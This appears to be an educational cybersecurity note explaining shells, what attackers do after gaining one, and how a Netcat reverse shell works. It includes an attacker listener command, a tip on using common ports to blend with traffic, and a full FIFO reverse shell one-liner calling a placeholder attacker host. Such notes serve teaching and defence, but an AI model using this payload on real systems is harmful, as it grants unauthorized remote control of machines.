### **What is a Shell?**

A **shell** is software that lets a user interact with an operating system. Usually a **command-line interface (CLI)** (e.g., Bash), though it can be graphical. In cybersecurity, a shell refers to an **attacker’s command session** on a compromised system.
### **Why Shell Access Matters**

Once an attacker gets a shell, they can:

- **Remote System Control** → Run commands and programs on the target
- **Privilege Escalation** → Upgrade from low-privileged to admin/root access
- **Data Exfiltration** → Locate, read, and steal sensitive data
- **Persistence** → Create users, backdoors, or scheduled access
- **Post-Exploitation** → Deploy malware, hide activity, remove evidence
- **Pivoting** → Use the compromised system to attack other network hosts

---
# **Reverse Shells (Netcat) 

**Reverse shell:** Target system initiates a connection back to the attacker, giving remote shell access.

**Listener setup (attacker):**

```
  nc -lvnp 443
``` 

- `-l`: listen
- `-v`: verbose
- `-n`: no DNS
- `-p`: port
- Common ports (53, 80, 443, etc.) help blend with normal traffic.

**Reverse shell payload (example – pipe/FIFO):**

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

- Removes old pipe, creates FIFO.
- Pipes input to an interactive shell.
- Sends shell I/O over Netcat to attacker.
- FIFO enables two-way communication.

---
